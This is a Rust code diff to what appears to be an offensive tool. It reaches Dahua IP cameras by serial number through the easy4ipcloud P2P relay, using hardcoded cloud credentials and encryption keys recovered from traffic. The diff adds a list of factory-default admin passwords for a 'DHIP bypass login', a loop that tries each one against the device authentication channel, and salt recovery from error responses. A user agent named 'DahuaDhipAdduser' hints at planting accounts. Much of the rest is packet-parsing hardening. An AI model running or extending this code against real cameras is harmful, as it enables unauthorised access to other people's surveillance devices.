@@ -21,6 +21,11 @@ pub const MAIN_SERVER: &str = "www.easy4ipcloud.com:8800";
 pub const USERNAME: &str = "cba1b29e32cb17aa46b8ff9e73c7f40b";
 pub const USERKEY: &str = "996103384cdf19179e19243e959bbf8b";
 
+/// Factory-default admin passwords (documented in Dahua manuals), used both for
+/// DHIP bypass login (`--try-defaults`) and for the P2P channel DevAuth.
+pub const DEFAULT_ADMIN_PASSWORDS: &[&str] =
+    &["admin", "123456", "888888", "54321", "admin123", "12345"];
+
 // The cloud encrypts the /info/device/{serial} payload with a fixed key and IV
 // shared by every device (recovered from an easy4ipcloud capture).
 const INFO_KEY: &[u8] = b"kRjmsUB&ezmdGLL67H#$ojw@XflcaIaf";
@@ -31,6 +36,16 @@ const DEV_IV: &[u8] = b"2z52*lk9o6HRyJrf";
 
 /// Set to true (e.g. via --verbose) to dump raw HTTP/PTCP exchange details.
 pub static HTTP_DEBUG: AtomicBool = AtomicBool::new(false);
+
+/// Set by `http_call` when a DISC status is received from the device on the current
+/// channel. Callers should check this after `http_call` returns `None` to distinguish
+/// an active disconnect from a timeout and abort early.
+pub static LAST_CALL_DISC: AtomicBool = AtomicBool::new(false);
+
+/// Returns true if the last `http_call` ended because the device sent a DISC status.
+pub fn last_call_disc() -> bool {
+    LAST_CALL_DISC.load(Ordering::Relaxed)
+}
 
 // ---- DH Response ----
 
@@ -48,9 +63,7 @@ impl DHResponse {
         let mut tree = HashMap::new();
         loop {
             match parser.next() {
-                Ok(xml::reader::XmlEvent::StartElement { name, .. }) => {
-                    stack.push(name.local_name)
-                }
+                Ok(xml::reader::XmlEvent::StartElement { name, .. }) => stack.push(name.local_name),
                 Ok(xml::reader::XmlEvent::EndElement { .. }) => {
                     stack.pop();
                 }
@@ -74,18 +87,17 @@ impl DHResponse {
         let status_line = lines.next().unwrap_or("");
         let mut status_parts = status_line.splitn(3, ' ');
         let _version = status_parts.next();
-        let code: u16 = status_parts.next().and_then(|c| c.parse().ok()).unwrap_or(0);
+        let code: u16 = status_parts
+            .next()
+            .and_then(|c| c.parse().ok())
+            .unwrap_or(0);
         let status = status_parts.next().unwrap_or("").to_string();
 
         let body = match body.trim().len() {
             0 => None,
             _ => Some(Self::parse_body(body)),
         };
-        Self {
-            code,
-            status,
-            body,
-        }
+        Self { code, status, body }
     }
 }
 
@@ -101,14 +113,17 @@ pub struct PTCPPayload {
 
 impl PTCPPayload {
     pub fn parse(data: &[u8]) -> Self {
-        let header = u32::from_be_bytes([data[0], data[1], data[2], data[3]]);
-        let length = header & 0xFFFF;
-        let realm = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
-        let payload = data[12..].to_vec();
-        assert_eq!(length as usize, payload.len(), "Invalid PTCP payload length");
+        // Defensive: short/malformed datagrams do arrive from some relays and
+        // must never panic a batch run (seen in the field, 8-byte payloads).
+        let realm = if data.len() >= 8 {
+            u32::from_be_bytes([data[4], data[5], data[6], data[7]])
+        } else {
+            0
+        };
+        let start = 12.min(data.len());
         PTCPPayload {
             realm,
-            data: payload,
+            data: data[start..].to_vec(),
         }
     }
 
@@ -146,11 +161,11 @@ impl PTCPBody {
         match data[0] {
             0x00 => PTCPBody::Sync,
             0x10 => PTCPBody::Payload(PTCPPayload::parse(data)),
-            0x11 => PTCPBody::Bind(
+            0x11 if data.len() >= 16 => PTCPBody::Bind(
                 u32::from_be_bytes([data[4], data[5], data[6], data[7]]),
                 u32::from_be_bytes([data[12], data[13], data[14], data[15]]),
             ),
-            0x12 => {
+            0x12 if data.len() >= 12 => {
                 let realm = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
                 let status = String::from_utf8_lossy(&data[12..]).to_string();
                 PTCPBody::Status(realm, status)
@@ -180,9 +195,7 @@ impl PTCPBody {
                 v.extend_from_slice(status.as_bytes());
                 v
             }
-            PTCPBody::Heartbeat => {
-                b"\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec()
-            }
+            PTCPBody::Heartbeat => b"\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
             PTCPBody::Empty => Vec::new(),
         }
     }
@@ -198,7 +211,6 @@ impl PTCPBody {
             PTCPBody::Empty => 0,
         }
     }
-
 }
 
 #[derive(Debug)]
@@ -213,6 +225,18 @@ pub struct PTCPPacket {
 
 impl PTCPPacket {
     pub fn parse(data: &[u8]) -> Self {
+        // Defensive: datagrams shorter than the 24-byte PTCP header arrive from
+        // some relays/devices; return an Empty packet instead of panicking.
+        if data.len() < 24 {
+            return PTCPPacket {
+                sent: 0,
+                recv: 0,
+                pid: 0,
+                lmid: 0,
+                rmid: 0,
+                body: PTCPBody::Empty,
+            };
+        }
         let sent = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
         let recv = u32::from_be_bytes([data[8], data[9], data[10], data[11]]);
         let pid = u32::from_be_bytes([data[12], data[13], data[14], data[15]]);
@@ -321,6 +345,9 @@ where
 {
     loop {
         let data = udp_recv(sock, timeout_dur).await?;
+        if data.len() < 25 {
+            continue;
+        }
         let body = PTCPBody::parse(&data[24..]);
 
         if f(&body) {
@@ -356,9 +383,26 @@ fn aes_ofb_apply(key: &[u8], iv: &[u8], data: &[u8]) -> Vec<u8> {
 /// Returns the device salt and service ports, e.g.
 /// {"httpport": 80, "privport": 37777, "randsalt": "...", "rtspport": 554}.
 fn decrypt_device_info(enc_b64: &str) -> Option<serde_json::Value> {
-    let data = base64::engine::general_purpose::STANDARD.decode(enc_b64).ok()?;
+    let data = base64::engine::general_purpose::STANDARD
+        .decode(enc_b64)
+        .ok()?;
     let dec = aes_ofb_apply(INFO_KEY, INFO_IV, &data);
     serde_json::from_slice(&dec).ok()
+}
+
+/// Look for a <RandSalt> element inside an error response body (the DH/XML map
+/// keys are the dotted XML paths). Used when the anonymous /info/device did not
+/// expose the salt but the refused channel response still carries it.
+fn randsalt_from_err_body(body: &HashMap<String, String>) -> Option<String> {
+    for (k, v) in body {
+        if k == "RandSalt" || k.ends_with("/RandSalt") {
+            let s = v.trim();
+            if !s.is_empty() {
+                return Some(s.to_string());
+            }
+        }
+    }
+    None
 }
 
 /// Device auth key: MD5("{user}:Login to {randsalt}:{password}") uppercase hex
@@ -430,6 +474,7 @@ pub async fn p2p_handshake(
     relay_mode: bool,
     admin_user: &str,
     admin_pass: &str,
+    try_defaults: bool,
 ) -> Result<HandshakeResult, String> {
     let mut cseq = 0u32;
 
@@ -442,9 +487,7 @@ pub async fn p2p_handshake(
         .map_err(|e| format!("connect to main server: {}", e))?;
 
     // Probe p2psrv
-    socket
-        .dh_request("/probe/p2psrv", None, &mut cseq)
-        .await;
+    socket.dh_request("/probe/p2psrv", None, &mut cseq).await?;
     let probe = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
     if probe.code >= 400 {
         return Err(format!(
@@ -455,12 +498,8 @@ pub async fn p2p_handshake(
 
     // Lookup p2psrv
     socket
-        .dh_request(
-            &format!("/online/p2psrv/{}", serial),
-            None,
-            &mut cseq,
-        )
-        .await;
+        .dh_request(&format!("/online/p2psrv/{}", serial), None, &mut cseq)
+        .await?;
     let online = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
     if online.code >= 400 {
         return Err(format!(
@@ -483,7 +522,7 @@ pub async fn p2p_handshake(
     }
 
     // Get relay
-    socket.dh_request("/online/relay", None, &mut cseq).await;
+    socket.dh_request("/online/relay", None, &mut cseq).await?;
     let relay_resp = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
     let relay = match relay_resp.body {
         Some(ref b) => b.get("body/Address").cloned().unwrap_or_default(),
@@ -503,7 +542,7 @@ pub async fn p2p_handshake(
         .map_err(|e| format!("connect to p2psrv: {}", e))?;
     socket2
         .dh_request(&format!("/probe/device/{}", serial), None, &mut cseq)
-        .await;
+        .await?;
     let probe_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
     if probe_resp.code >= 400 {
         return Err(format!(
@@ -517,7 +556,7 @@ pub async fn p2p_handshake(
     let mut randsalt = String::new();
     socket2
         .dh_request(&format!("/info/device/{}", serial), None, &mut cseq)
-        .await;
+        .await?;
     let info_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
     if HTTP_DEBUG.load(Ordering::Relaxed) {
         eprintln!(
@@ -557,14 +596,14 @@ pub async fn p2p_handshake(
             )),
             &mut cseq,
         )
-        .await;
+        .await?;
 
     // Relay agent
     socket2
         .connect(&relay)
         .await
         .map_err(|e| format!("connect to relay: {}", e))?;
-    socket2.dh_request("/relay/agent", None, &mut cseq).await;
+    socket2.dh_request("/relay/agent", None, &mut cseq).await?;
     let agent_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
     if agent_resp.code >= 400 {
         return Err(format!(
@@ -592,7 +631,7 @@ pub async fn p2p_handshake(
             Some("<body><Client>:0</Client></body>"),
             &mut cseq,
         )
-        .await;
+        .await?;
     let start_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
     if start_resp.code >= 400 {
         return Err(format!(
@@ -603,38 +642,72 @@ pub async fn p2p_handshake(
 
     // Wait for device channel
     let mut res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
-    if res.code == 100 {
-        res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
+    // Some firmware/firmware variants refuse the anonymous channel with 403
+    // OR 401. When the salt is not known, try to recover it from the channel
+    // error body (the relay may echo <RandSalt> in the DevPwd_InvalidSalt case).
+    let requires_auth = matches!(res.code, 401 | 403);
+    if requires_auth && randsalt.is_empty() {
+        if let Some(b) = &res.body {
+            if let Some(s) = randsalt_from_err_body(b) {
+                if HTTP_DEBUG.load(Ordering::Relaxed) {
+                    eprintln!("[debug] randsalt from channel error body: {}", s);
+                }
+                randsalt = s;
+            }
+        }
     }
     let mut auth_key: Option<Vec<u8>> = None;
-    if res.code == 403 && !randsalt.is_empty() {
-        // Newer firmware rejects the anonymous channel (403); retry with the
-        // authenticated DevAuth/IpEncrptV2 channel using device credentials.
+    if requires_auth && !randsalt.is_empty() {
+        // Retry with the authenticated DevAuth/IpEncrptV2 channel using device
+        // credentials: the explicit --admin-pass first, then the factory default
+        // passwords when --try-defaults is set.
         eprintln!(
-            "[debug] P2P channel requires auth (403); retrying with device credentials"
+            "[debug] P2P channel requires auth ({}); retrying with device credentials",
+            res.code
         );
-        let key = p2p_auth_key(admin_user, admin_pass, &randsalt);
-        let nonce: u32 = rand::random();
-        let laddr = format!("127.0.0.1:{}", socket.local_addr().unwrap().port());
-        let enc_laddr = encrypt_local_addr(&key, nonce, &laddr);
-        let auth_xml = build_dev_auth(&key, admin_user, nonce, &randsalt, &enc_laddr);
-        let body = format!(
-            "<body>{auth_xml}<Identify>{}</Identify><IpEncrptV2>true</IpEncrptV2><LocalAddr>{}</LocalAddr><version>5.0.0</version></body>",
-            cid_hex.join(" "),
-            enc_laddr
-        );
-        socket
-            .dh_request(
-                &format!("/device/{}/p2p-channel", serial),
-                Some(&body),
-                &mut cseq,
-            )
-            .await;
-        res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
-        if res.code == 100 {
-            res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
+        let mut passwords: Vec<&str> = Vec::new();
+        if !admin_pass.is_empty() {
+            passwords.push(admin_pass);
         }
-        auth_key = Some(key);
+        if try_defaults {
+            passwords.extend(DEFAULT_ADMIN_PASSWORDS);
+        }
+        for pw in passwords {
+            let key = p2p_auth_key(admin_user, pw, &randsalt);
+            let nonce: u32 = rand::random();
+            let laddr = format!("127.0.0.1:{}", socket.local_addr().unwrap().port());
+            let enc_laddr = encrypt_local_addr(&key, nonce, &laddr);
+            let auth_xml = build_dev_auth(&key, admin_user, nonce, &randsalt, &enc_laddr);
+            let body = format!(
+                "<body>{auth_xml}<Identify>{}</Identify><IpEncrptV2>true</IpEncrptV2><LocalAddr>{}</LocalAddr><version>5.0.0</version></body>",
+                cid_hex.join(" "),
+                enc_laddr
+            );
+            socket
+                .dh_request(
+                    &format!("/device/{}/p2p-channel", serial),
+                    Some(&body),
+                    &mut cseq,
+                )
+                .await?;
+            res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
+            if res.code == 100 {
+                res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
+            }
+            if res.code < 400 {
+                auth_key = Some(key);
+                if try_defaults && pw != admin_pass {
+                    println!("  [i] P2P channel auth OK with default password '{}'", pw);
+                }
+                break;
+            }
+            if HTTP_DEBUG.load(Ordering::Relaxed) {
+                eprintln!(
+                    "[debug] DevAuth with '{}' failed: {} {}",
+                    pw, res.code, res.status
+                );
+            }
+        }
     }
     if HTTP_DEBUG.load(Ordering::Relaxed) {
         eprintln!(
@@ -648,8 +721,10 @@ pub async fn p2p_handshake(
         }
         let hint = if randsalt.is_empty() {
             " (no device salt available — firmware may need --admin-pass)"
-        } else {
+        } else if !admin_pass.is_empty() {
             " — check --admin-user/--admin-pass credentials"
+        } else {
+            " — retry with --admin-pass or --try-defaults"
         };
         return Err(format!(
             "P2P channel error: {} {}{}",
@@ -660,10 +735,7 @@ pub async fn p2p_handshake(
         Some(b) => b,
         None => return Err("No body in P2P channel response".to_string()),
     };
-    let device_pub = resp_body
-        .get("body/PubAddr")
-        .cloned()
-        .unwrap_or_default();
+    let device_pub = resp_body.get("body/PubAddr").cloned().unwrap_or_default();
     if device_pub.is_empty() {
         return Err("Device PubAddr is empty — device may be offline".to_string());
     }
@@ -697,7 +769,7 @@ pub async fn p2p_handshake(
                 Some(&rc_body),
                 &mut cseq,
             )
-            .await;
+            .await?;
         // The "Server Nat Info!" response is relayed by the agent, so point the
         // socket at the agent right after sending: on a connected UDP socket the
         // kernel drops datagrams from any other address.
@@ -735,7 +807,7 @@ pub async fn p2p_handshake(
                 Some(&rc_body),
                 &mut cseq,
             )
-            .await;
+            .await?;
         let mut rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(5)).await;
         if rc_resp.code == 100 {
             rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(5)).await;
@@ -772,7 +844,7 @@ pub async fn p2p_handshake(
             .connect(&relay)
             .await
             .map_err(|e| format!("reconnect socket2 to relay for refresh: {}", e))?;
-        socket2.dh_request("/relay/agent", None, &mut cseq).await;
+        socket2.dh_request("/relay/agent", None, &mut cseq).await?;
         let refresh_agent = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
         if refresh_agent.code >= 400 {
             return Err(format!(
@@ -811,7 +883,7 @@ pub async fn p2p_handshake(
                 Some("<body><Client>:0</Client></body>"),
                 &mut cseq,
             )
-            .await;
+            .await?;
         let start_resp2 = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
         if start_resp2.code >= 400 {
             return Err(format!(
@@ -834,7 +906,7 @@ pub async fn p2p_handshake(
                     )),
                     &mut cseq,
                 )
-                .await;
+                .await?;
             // The server first answers "100 Trying", then sends the "200 Server
             // Nat Info!" once the device has connected to the agent.
             let mut mcw_resp = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
@@ -965,11 +1037,7 @@ pub async fn p2p_handshake(
     }
     let mut pkt = agent_session.recv(PTCPPacket::parse(&sign_data));
     while matches!(pkt.body, PTCPBody::Empty) {
-        udp_send(
-            &socket2,
-            &agent_session.send(PTCPBody::Empty).serialize(),
-        )
-        .await;
+        udp_send(&socket2, &agent_session.send(PTCPBody::Empty).serialize()).await;
         let data = udp_recv(&socket2, Duration::from_secs(5))
             .await
             .ok_or("Timeout waiting for sign data".to_string())?;
@@ -1009,7 +1077,10 @@ pub async fn p2p_handshake(
             "Timeout waiting for device hole-punch response. Try --relay mode.".to_string(),
         );
     }
-    let _n = result.unwrap().unwrap();
+    let n = result.unwrap().unwrap_or(0);
+    if n < 20 {
+        return Err("Malformed device hole-punch response. Try --relay mode.".to_string());
+    }
     let rtrans_id = &buf[8..20];
 
     let local_addr_str = socket.local_addr().unwrap().to_string();
@@ -1028,19 +1099,12 @@ pub async fn p2p_handshake(
 
     // Establish PTCP with device
     let mut device_session = PTCPSession::new();
-    udp_send(
-        &socket,
-        &device_session.send(PTCPBody::Sync).serialize(),
-    )
-    .await;
+    udp_send(&socket, &device_session.send(PTCPBody::Sync).serialize()).await;
 
     {
-        let pkt = recv_until(
-            &socket,
-            &mut device_session,
-            Duration::from_secs(5),
-            |b| matches!(b, PTCPBody::Sync),
-        )
+        let pkt = recv_until(&socket, &mut device_session, Duration::from_secs(5), |b| {
+            matches!(b, PTCPBody::Sync)
+        })
         .await
         .ok_or("Timeout waiting for PTCP Sync from device".to_string())?;
         assert!(matches!(pkt.body, PTCPBody::Sync));
@@ -1050,15 +1114,16 @@ pub async fn p2p_handshake(
     auth_req.extend_from_slice(&sign);
     udp_send(
         &socket,
-        &device_session
-            .send(PTCPBody::Command(auth_req))
-            .serialize(),
+        &device_session.send(PTCPBody::Command(auth_req)).serialize(),
     )
     .await;
 
-    pkt = recv_until(&socket, &mut device_session, Duration::from_secs(5), |b| {
-        matches!(b, PTCPBody::Command(c) if !c.is_empty() && c[0] == 0x1A)
-    })
+    pkt = recv_until(
+        &socket,
+        &mut device_session,
+        Duration::from_secs(5),
+        |b| matches!(b, PTCPBody::Command(c) if !c.is_empty() && c[0] == 0x1A),
+    )
     .await
     .ok_or("Timeout waiting for PTCP auth response from device".to_string())?;
     assert!(matches!(&pkt.body, PTCPBody::Command(c) if c[0] == 0x1A));
@@ -1073,12 +1138,9 @@ pub async fn p2p_handshake(
     )
     .await;
 
-    let _ = recv_until(
-        &socket,
-        &mut device_session,
-        Duration::from_secs(3),
-        |b| matches!(b, PTCPBody::Empty),
-    )
+    let _ = recv_until(&socket, &mut device_session, Duration::from_secs(3), |b| {
+        matches!(b, PTCPBody::Empty)
+    })
     .await;
 
     Ok(HandshakeResult {
@@ -1156,6 +1218,9 @@ pub async fn dhip_recv(
         }
 
         let raw = udp_recv(sock, remaining).await?;
+        if raw.len() < 25 {
+            continue;
+        }
         let pkt = PTCPPacket::parse(&raw);
         let body = PTCPBody::parse(&raw[24..]);
 
@@ -1200,18 +1265,30 @@ pub async fn dhip_recv(
                         eprintln!("  [debug] dhip_recv: payload realm={} unknown fmt: flag=0x{:08x} magic=0x{:08x} len={}", realm_id, head_flag, magic, buf.len());
                     }
                 } else {
-                    eprintln!("  [debug] dhip_recv: payload realm={} short ({} bytes)", realm_id, buf.len());
+                    eprintln!(
+                        "  [debug] dhip_recv: payload realm={} short ({} bytes)",
+                        realm_id,
+                        buf.len()
+                    );
                 }
             }
             PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                 break;
             }
             PTCPBody::Status(r, s) if *r != realm_id => {
-                eprintln!("  [debug] dhip_recv: status realm={} not matching realm_id={}: '{}'", r, realm_id, s);
+                eprintln!(
+                    "  [debug] dhip_recv: status realm={} not matching realm_id={}: '{}'",
+                    r, realm_id, s
+                );
                 continue;
             }
             PTCPBody::Payload(p) if p.realm != realm_id => {
-                eprintln!("  [debug] dhip_recv: payload realm={} != realm_id={} ({} bytes)", p.realm, realm_id, p.data.len());
+                eprintln!(
+                    "  [debug] dhip_recv: payload realm={} != realm_id={} ({} bytes)",
+                    p.realm,
+                    realm_id,
+                    p.data.len()
+                );
                 continue;
             }
             PTCPBody::Heartbeat => {
@@ -1230,8 +1307,15 @@ pub async fn dhip_recv(
                 let raw_type = if raw.len() > 24 { raw[24] } else { 0 };
                 let realm_val = if raw.len() > 28 {
                     u32::from_be_bytes([raw[28], raw[29], raw[30], raw[31]])
-                } else { 0 };
-                eprintln!("  [debug] dhip_recv: unhandled body type=0x{:02x} realm={} len={}", raw_type, realm_val, raw.len());
+                } else {
+                    0
+                };
+                eprintln!(
+                    "  [debug] dhip_recv: unhandled body type=0x{:02x} realm={} len={}",
+                    raw_type,
+                    realm_val,
+                    raw.len()
+                );
                 continue;
             }
         }
@@ -1259,9 +1343,13 @@ pub async fn dhip_call(
         let mut s = dhip.lock().await;
         let pkt = s.build_packet(json_str);
         let mut ps = pcp_session.lock().await;
-        eprintln!("  [debug] dhip_call: sending realm={} sess={} req_id={} json={}",
-            realm_id, s.session_id, s.request_id,
-            &json_str[..json_str.len().min(120)]);
+        eprintln!(
+            "  [debug] dhip_call: sending realm={} sess={} req_id={} json={}",
+            realm_id,
+            s.session_id,
+            s.request_id,
+            &json_str[..json_str.len().min(120)]
+        );
         udp_send(
             sock,
             &ps.send(PTCPBody::Payload(PTCPPayload {
@@ -1365,7 +1453,9 @@ mod tests {
         assert_eq!(enc, "PN0tQWlGB4+flbo0cIE=");
 
         let auth_xml = build_dev_auth_at(&key, user, nonce, randsalt, &enc, curdate);
-        assert!(auth_xml.contains("<DevAuth>LUvOwPJA0VYVbqrbwC58rpvgKd/iYwV2zk4Dqr89JE8=</DevAuth>"));
+        assert!(
+            auth_xml.contains("<DevAuth>LUvOwPJA0VYVbqrbwC58rpvgKd/iYwV2zk4Dqr89JE8=</DevAuth>")
+        );
         assert!(auth_xml.contains("<RandSalt>a8fe9aedac8af59d8434062ba696333d</RandSalt>"));
         assert!(auth_xml.contains("<UserName>admin</UserName>"));
     }
@@ -1381,6 +1471,49 @@ mod tests {
             info.get("randsalt").and_then(|v| v.as_str()),
             Some("a8fe9aedac8af59d8434062ba696333d")
         );
+    }
+
+    #[test]
+    fn extracts_randsalt_from_error_body() {
+        let mut body = HashMap::new();
+        body.insert(
+            "body/RandSalt".to_string(),
+            "a8fe9aedac8af59d8434062ba696333d".to_string(),
+        );
+        assert_eq!(
+            randsalt_from_err_body(&body),
+            Some("a8fe9aedac8af59d8434062ba696333d".to_string())
+        );
+        let mut body2 = HashMap::new();
+        body2.insert("RandSalt".to_string(), "deadbeef".to_string());
+        assert_eq!(randsalt_from_err_body(&body2), Some("deadbeef".to_string()));
+        let mut body3 = HashMap::new();
+        body3.insert("body/Result".to_string(), "DevPwd_InvalidSalt".to_string());
+        assert_eq!(randsalt_from_err_body(&body3), None);
+    }
+
+    #[test]
+    fn short_malformed_packets_do_not_panic() {
+        // Field crash: an 8-byte 0x10 datagram panicked PTCPPayload::parse.
+        let short_payload = [0x10, 0x00, 0x00, 0x00, 1, 2, 3, 4];
+        match PTCPBody::parse(&short_payload) {
+            PTCPBody::Payload(p) => assert!(p.data.is_empty()),
+            other => panic!("expected Payload, got {:?}", other),
+        }
+        // Shorter than a PTCP header → Empty packet, no panic.
+        for len in [0usize, 4, 8, 16, 23] {
+            let raw = vec![0u8; len];
+            let pkt = PTCPPacket::parse(&raw);
+            assert!(matches!(pkt.body, PTCPBody::Empty));
+        }
+        // Truncated Bind/Status fall back to Command instead of panicking.
+        let short_bind = [0x11u8, 0, 0, 0, 1, 2, 3];
+        assert!(matches!(PTCPBody::parse(&short_bind), PTCPBody::Command(_)));
+        let short_status = [0x12u8, 0, 0, 0, 1, 2];
+        assert!(matches!(
+            PTCPBody::parse(&short_status),
+            PTCPBody::Command(_)
+        ));
     }
 }
 
@@ -1398,20 +1531,26 @@ fn ip_to_bytes(addr: &str) -> Vec<u8> {
 
 #[async_trait]
 trait DhP2P {
-    async fn dh_request(&self, path: &str, body: Option<&str>, seq: &mut u32);
+    async fn dh_request(&self, path: &str, body: Option<&str>, seq: &mut u32)
+        -> Result<(), String>;
     async fn dh_read_raw_timeout(&self, dur: Duration) -> DHResponse;
 }
 
 #[async_trait]
 impl DhP2P for UdpSocket {
-    async fn dh_request(&self, path: &str, body: Option<&str>, seq: &mut u32) {
+    async fn dh_request(
+        &self,
+        path: &str,
+        body: Option<&str>,
+        seq: &mut u32,
+    ) -> Result<(), String> {
         let method = if body.is_some() { "DHPOST" } else { "DHGET" };
         let body_str = body.unwrap_or("");
         let nonce: u32 = rand::random();
         let currdate = Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
         let pwd = format!("{}{}DHP2P:{}:{}", nonce, currdate, USERNAME, USERKEY);
-        let digest = base64::engine::general_purpose::STANDARD
-            .encode(sha1::Sha1::digest(pwd.as_bytes()));
+        let digest =
+            base64::engine::general_purpose::STANDARD.encode(sha1::Sha1::digest(pwd.as_bytes()));
         *seq += 1;
         let req = format!(
             "{} {} HTTP/1.1\r\n\
@@ -1420,7 +1559,10 @@ impl DhP2P for UdpSocket {
              X-WSSE: UsernameToken Username=\"{}\", PasswordDigest=\"{}\", Nonce=\"{}\", Created=\"{}\"\r\n\r\n{}",
             method, path, seq, USERNAME, digest, nonce, currdate, body_str
         );
-        self.send(req.as_bytes()).await.unwrap();
+        self.send(req.as_bytes())
+            .await
+            .map_err(|e| format!("DH send error ({} {}): {}", method, path, e))?;
+        Ok(())
     }
 
     async fn dh_read_raw_timeout(&self, dur: Duration) -> DHResponse {
@@ -1462,6 +1604,9 @@ pub async fn wait_for_ptcp(
         }
 
         let data = udp_recv(sock, remaining).await?;
+        if data.len() < 25 {
+            continue;
+        }
         let pkt = PTCPPacket::parse(&data);
 
         {
@@ -1518,11 +1663,7 @@ pub async fn ptcp_bind(
     }
 }
 
-pub async fn ptcp_disconnect(
-    sock: &UdpSocket,
-    session: &Mutex<PTCPSession>,
-    realm_id: u32,
-) {
+pub async fn ptcp_disconnect(sock: &UdpSocket, session: &Mutex<PTCPSession>, realm_id: u32) {
     {
         let mut s = session.lock().await;
         udp_send(
@@ -1577,10 +1718,9 @@ pub async fn http_call(
     session: &str,
 ) -> Option<String> {
     if HTTP_DEBUG.load(Ordering::Relaxed) {
-        eprintln!(
-            "[debug] http_call -> {} ({}-byte body)", path, body.len()
-        );
+        eprintln!("[debug] http_call -> {} ({}-byte body)", path, body.len());
     }
+    LAST_CALL_DISC.store(false, Ordering::Relaxed);
     let cookie = if session.is_empty() {
         String::new()
     } else {
@@ -1644,6 +1784,9 @@ pub async fn http_call(
             Some(raw) => raw,
             None => break,
         };
+        if raw.len() < 25 {
+            continue;
+        }
         pkt_count += 1;
         let pkt = PTCPPacket::parse(&raw);
         let body_type = PTCPBody::parse(&raw[24..]);
@@ -1718,7 +1861,13 @@ pub async fn http_call(
                 udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                 continue;
             }
-            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => break,
+            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
+                if HTTP_DEBUG.load(Ordering::Relaxed) {
+                    eprintln!("[debug] http_call: DISC received — device disconnected channel");
+                }
+                LAST_CALL_DISC.store(true, Ordering::Relaxed);
+                break;
+            }
             _ => continue,
         }
     }
@@ -1728,6 +1877,170 @@ pub async fn http_call(
     } else {
         Some(String::from_utf8_lossy(&buf).to_string())
     }
+}
+
+/// Send an HTTP **GET** through the PTCP tunnel and return the raw response body
+/// bytes (e.g. a JPG snapshot). Unlike `http_call` it keeps the data as bytes so
+/// binary payloads are not corrupted by UTF-8 conversion. Basic auth is added via
+/// the `Authorization` header, but the caller should also pass credentials as
+/// query params for Dahua's snapshot CGI which often ignores the header.
+/// Returns `(headers, body_bytes)` if a full response was read.
+pub async fn http_get_binary(
+    sock: &UdpSocket,
+    pcp_session: &Mutex<PTCPSession>,
+    realm_id: u32,
+    host: &str,
+    path: &str,
+    timeout: Duration,
+    user: &str,
+    password: &str,
+) -> Option<(String, Vec<u8>)> {
+    LAST_CALL_DISC.store(false, Ordering::Relaxed);
+
+    let auth = base64_encode_basic(&format!("{}:{}", user, password));
+    let http_request = format!(
+        "GET {path} HTTP/1.1\r\n\
+         Accept-Encoding: identity\r\n\
+         Connection: close\r\n\
+         User-Agent: DahuaDhipAdduser\r\n\
+         Authorization: Basic {auth}\r\n\
+         Host: {host}\r\n\
+         \r\n"
+    );
+
+    {
+        let mut ps = pcp_session.lock().await;
+        udp_send(
+            sock,
+            &ps.send(PTCPBody::Payload(PTCPPayload {
+                realm: realm_id,
+                data: http_request.as_bytes().to_vec(),
+            }))
+            .serialize(),
+        )
+        .await;
+    }
+
+    let deadline = tokio::time::Instant::now() + timeout;
+    let mut buf: Vec<u8> = Vec::new();
+    let mut last_activity = tokio::time::Instant::now();
+    let mut have_headers = false;
+    let mut content_len: Option<usize> = None;
+    let mut body_offset = 0usize;
+
+    loop {
+        let now = tokio::time::Instant::now();
+        let remaining = if have_headers {
+            (last_activity + timeout).saturating_duration_since(now)
+        } else {
+            deadline.saturating_duration_since(now)
+        };
+        if remaining.is_zero() {
+            break;
+        }
+
+        let raw = match udp_recv(sock, remaining).await {
+            Some(raw) => raw,
+            None => break,
+        };
+        if raw.len() < 25 {
+            continue;
+        }
+        let pkt = PTCPPacket::parse(&raw);
+        let body_type = PTCPBody::parse(&raw[24..]);
+
+        let pkt_realm = match &body_type {
+            PTCPBody::Payload(p) => Some(p.realm),
+            PTCPBody::Status(r, _) => Some(*r),
+            _ => None,
+        };
+
+        {
+            let mut s = pcp_session.lock().await;
+            if pkt_realm == Some(realm_id) {
+                s.recv(pkt);
+            } else {
+                s.recv_only_bytes(&pkt);
+            }
+        }
+
+        match &body_type {
+            PTCPBody::Payload(p) if p.realm == realm_id => {
+                last_activity = tokio::time::Instant::now();
+                {
+                    let mut s = pcp_session.lock().await;
+                    udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
+                }
+                buf.extend_from_slice(&p.data);
+
+                if !have_headers {
+                    // locate header/body separator on raw bytes
+                    if let Some(pos) = find_bytes(&buf, b"\r\n\r\n") {
+                        have_headers = true;
+                        body_offset = pos + 4;
+                        let headers = String::from_utf8_lossy(&buf[..pos]).into_owned();
+                        content_len = headers
+                            .lines()
+                            .find(|l| l.to_lowercase().starts_with("content-length:"))
+                            .and_then(|l| l.split(':').nth(1))
+                            .and_then(|s| s.trim().parse::<usize>().ok());
+                        let headers_clone = headers.clone();
+                        if content_len.is_none() {
+                            return Some((headers_clone, buf[body_offset..].to_vec()));
+                        }
+                    } else {
+                        continue;
